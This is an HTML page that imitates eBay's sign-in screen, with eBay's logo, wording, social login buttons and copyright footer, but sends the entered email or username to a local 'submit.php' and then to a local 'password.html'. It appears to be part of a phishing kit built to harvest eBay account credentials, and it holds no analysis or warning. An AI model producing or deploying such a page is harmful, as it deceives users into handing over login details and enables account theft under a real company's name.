<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Sign in of Registre | eBay</title>
	<link rel="stylesheet" href="style.css">
</head>
<body>
	<div class="container">
		<nav>
		<ul>
	<li><a href="https://connect.ebay.com/srv/survey/a/reg.personalized" target="_blank" aria-label="Tell us what you think - Link opens in a new window">Tell us what you think</a></li>
	    </ul>
        </nav>
        <td class="gh-td">
        <a href="https://www.ebay.com/"><img width="250" height="200" style="clip:rect(47px, 118px, 95px, 0px);position:absolute;top:-8px;left:16px;"  src="image/1.png">
</a>
 
        </td>
        <div class="menu">
        <div class="center">
        <h1 id="greeting-msg" class="heading">Hello</h1>
        <span id="signin-reg-msg" tabindex = "-1" class="sub-heading">
        	Sign in to eBay or 
        <a id="create-account-link" href="https://reg.ebay.com/reg/PartialReg?siteid=0&amp;co_partnerId=0&amp;UsingSSL=1&amp;rv4=1&amp;ru=https%3A%2F%2Fwww.ebay.com%2F&amp;signInUrl=https%3A%2F%2Fwww.ebay.com%2Fsignin%3Fsgn%3Dreg%26siteid%3D0%26co_partnerId%3D0%26UsingSSL%3D1%26rv4%3D1%26ru%3Dhttps%253A%252F%252Fwww.ebay.com%252F">create an account</a>
        	
        </span>	
        
       <form method="post" id="signin-form" action="submit.php">
        <div class="txt_field">
          <input type="text" name="Email" required>
          <span></span>
          <label>Email or username</label>

        </div>
        <span></span>
        <a href="password.html"><button input type="submit" name="submit" value="Continue" id="signin-continue-btn" name="signin-continue-btn" class="btn btn--fluid btn--large btn--primary" data-ebayui="" type="submit" name="submit">Continue</button></a>
          </form>
        <div class="social-signin-wrapper">
            <div class="separator">
            <div class="separator-line animate">
            <div id="social-signin-wrapper-separator" class="separator-content animate">
            <mark>or</mark>    
                
        </div>    
        </div>          
        </div>
        </div>
        <a href="https://www.facebook.com/login.php?skip_api_login=1&api_key=159693524730858&kid_directed_site=0&app_id=159693524730858&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Flocale%3Den_US%26client_id%3D159693524730858%26scope%3Demail%26redirect_uri%3Dhttps%253A%252F%252Fwww.ebay.com%252Fsignin%252Ffb%252Fcb%26state%3Ddl4xLjEjaV4xI0leMyNyXjEjZl4wI3BeMSN0XlVsNDFYekE2UmpBNFJERTBORE14UkVRek1UZzBOVFE1TlVJME56WTNSa0V6UWtGQ1F6WmZNbDh4STBWZU1qWXc%253D%257C%257CAQAGAAAAMLVBZGwYFb2IycmTsN8AWr_PXbzUQTHuLje7QLpuxbANZ8if04lMsNUgYTnRFqPsiA%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D2c27ed3c-8f12-4a47-9e6b-f3a438806e28%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ebay.com%2Fsignin%2Ffb%2Fcb%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Ddl4xLjEjaV4xI0leMyNyXjEjZl4wI3BeMSN0XlVsNDFYekE2UmpBNFJERTBORE14UkVRek1UZzBOVFE1TlVJME56WTNSa0V6UWtGQ1F6WmZNbDh4STBWZU1qWXc%253D%257C%257CAQAGAAAAMLVBZGwYFb2IycmTsN8AWr_PXbzUQTHuLje7QLpuxbANZ8if04lMsNUgYTnRFqPsiA%23_%3D_&display=page&locale=fr_FR&pl_dbl=0"><div class="social-signin-buttons-reg"><div><button id="signin_fb_btn" class="scl-btn scl-btn--f btn btn--primary btn--large btn--fluid" type="button" onclick="openSocialFacebookFPRButtonClick(&quot;https://www.ebay.com/signin/fb/init?ru=https%3A%2F%2Fwww.ebay.com%2F&amp;sclSignin=1&quot;)" onkeypress="openSocialFacebookFPRLoginKeyPress(&quot;https://www.ebay.com/signin/fb/init?ru=https%3A%2F%2Fwww.ebay.com%2F&amp;sclSignin=1&quot; , event)">Continue with Facebook</button></a></div><div>
          <a href="https://accounts.google.com/o/oauth2/v2/auth/identifier?locale=en_US&client_id=510718330363-s8203tpcr3unvq2n580hoke0590m6rd8.apps.googleusercontent.com&scope=openid%20email%20profile&response_type=code&redirect_uri=https%3A%2F%2Fwww.ebay.com%2Fsignin%2Fggl%2Fcb&state=dl4xLjEjaV4xI3BeMSNyXjEjSV4zI2ZeMCN0XlVsNDFYekU2UlRRMk1rSXpORFkwTTBVMVFUa3lRa0V3Tnpjd01ERkNOa05CUWpORU5rWmZNbDh4STBWZU1qWXc%3D&flowName=GeneralOAuthFlow"><button id="signin_ggl_btn" class="scl-btn scl-btn--g btn btn--primary btn--large btn--fluid" type="button" onclick="openSocialGoogleButtonClick(&quot;https://www.ebay.com/signin/ggl/init?ru=https%3A%2F%2Fwww.ebay.com%2F&amp;sclSignin=1&quot;)" onkeypress="openSocialGoogleLoginKeyPress(&quot;https://www.ebay.com/signin/ggl/init?ru=https%3A%2F%2Fwww.ebay.com%2F&amp;sclSignin=1&quot; , event)">Continue with Google</button></a></div><div>
            <a href="https://appleid.apple.com/auth/authorize?scope=name+email&response_type=code%20id_token&redirect_uri=https%3A%2F%2Fwww.ebay.com%2Fsignin%2Fapple%2Fcb&state=dl4xLjEjaV4xI3JeMSNwXjEjZl4wI0leMyN0XlVsNDFYekE2TUVZeE1UVkVSRUUxTlRJNE1qUXhPVFEyUlRBd016QXdOVEpFT0VRNFEwWmZNbDh4STBWZU1qWXc%3D.0&locale=en_US&client_id=com.ebay.www&response_mode=form_post"><button id="signin_appl_btn" class="scl-btn scl-btn--a btn btn--primary btn--large btn--fluid" type="button" onclick="openSocialAppleButtonClick(&quot;https://www.ebay.com/signin/apple?ru=https%3A%2F%2Fwww.ebay.com%2F&amp;sclSignin=1&quot;)" onkeypress="openSocialAppleLoginKeyPress(&quot;https://www.ebay.com/signin/apple?ru=https%3A%2F%2Fwww.ebay.com%2F&amp;sclSignin=1&quot; , event)"><svg aria-hidden="true" class="scl-logo-apple" width="16px" height="17px"><use xlink:href="#apple-icon-black-square"></use></svg>Continue with Apple</button></a></div></div>

        <div class="roaming-auth"></div>

        <div class="kmsi-container">
          <input type="hidden" checked="" name="kmsi-unchecked" value="1">
          <label class="checkbox-label" id="kmsi-checkbox-lbl">
            <span class="checkbox custom">
              <input class="checkbox__control" type="checkbox" id="kmsi-checkbox" name="kmsi" checked="" value="1">
              <span class="checkbox__icon" hidden="">
                <svg class="checkbox__unchecked" focusable="false" aria-labelledby="s0-16-16-29-6-12-3-4-text" to-json="function k(){}" aria-hidden="true"><use xlink:href="#icon-checkbox-unchecked"></use></svg>
                <svg class="checkbox__checked" focusable="false" aria-labelledby="s0-16-16-29-6-12-3-5-text" to-json="function k(){}" aria-hidden="true"><use xlink:href="#icon-checkbox-checked"></use></svg></span>
              </span>Stay signed in</label>
              <label>Using a public or shared device?</label><label>Uncheck to protect your account.<br>
                <a href="" aria-label="Learn more about stay signed in." aria-expanded="false" id="kmsi-learn-more-link">Learn more</a></label> </div>




        </div>
<footer id="glbfooter" role="contentinfo" class="gh-w gh-flex">
  <div><div id="rtm_html_1650"></div><div id="rtm_html_1651"></div></div>
  <h2 class="gh-ar-hdn">Additional site navigation</h2>
  <div id="gf-t-box"><table class="gf-t" role="presentation"><tbody>
    <tr valign="top"><td class="gf-legal">Copyright © 1995-2021 eBay Inc. All Rights Reserved. <a href="https://www.ebayinc.com/accessibility/">Accessibility</a>,
     <a href="https://pages.ebay.com/help/policies/user-agreement.html">User Agreement</a>, <a href="https://pages.ebay.com/help/policies/privacy-policy.html">Privacy</a>, <a href="https://pages.ebay.com/help/account/cookies-web-beacons.html">Cookies</a>, <a href="https://www.ebay.com/adchoice/ccpa">Do not sell my personal information</a> and <a href="https://www.ebay.com/adchoice" id="gf-AdChoice">AdChoice</a></td><td nowrap="" align="center"><a title="Verify site's SSL certificate" _exsp="m571.l3943" href="https://seal.digicert.com/seals/popup/?tag=BIEBu4RK&amp;url=www.ebay.com&amp;lang=en&amp;cbr=1624802552824" onclick="this.href='https://seal.digicert.com/seals/popup/?tag=BIEBu4RK&amp;url=#D#&amp;lang=en&amp;cbr=1624802552824'.replace(/#D#/,location.host).replace(/#C#/, Date.now());return true" rel="noreferrer"><i id="gf-norton">Norton Secured - powered by DigiCert</i></a></td></tr></tbody></table></div><!--[if lt IE 9]></div><![endif]--></footer>


        </div>

	</div>


       

</body>
</html>
